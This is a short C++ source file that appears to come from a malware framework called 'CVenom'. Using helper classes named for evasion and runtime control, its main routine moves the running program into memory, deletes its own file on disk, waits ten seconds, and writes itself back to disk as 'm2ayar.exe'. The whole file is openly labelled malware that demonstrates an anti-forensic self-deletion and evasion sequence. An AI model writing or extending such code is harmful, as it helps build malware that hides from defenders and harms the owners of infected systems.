#include "../CVenom.h"
#include "../RuntimeTools.h"
#include "../EvasionTools.h"
#include "../DataTools.h"


using std::cout;


EvasionTools 	Evador;
DataTools	Disk;
RuntimeTools	Runner;


int main(MALWARE_ENTRY){
	cvinit(MALWARE_INIT);

	if(Evador.MoveIntoMemory())
		printf("MIM Error\n");

	Evador.SelfDestruct();

	Runner.Wait(10);

	if(Evador.MoveBackToDisk("m2ayar.exe"))
		printf("MBTD Error\n");

	cvexit(MALWARE_EXIT);
}
